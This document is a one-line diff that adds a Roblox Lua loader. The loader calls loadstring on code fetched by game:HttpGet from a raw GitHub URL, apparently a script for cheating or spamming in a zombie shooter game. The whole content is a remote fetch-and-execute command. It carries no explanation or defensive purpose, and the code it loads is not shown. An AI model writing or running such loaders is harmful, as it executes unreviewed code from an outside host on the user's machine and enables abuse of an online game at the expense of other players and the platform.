@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/zombies-hypershot-spam7-l2hb0t8amjzfgw.lua"))()
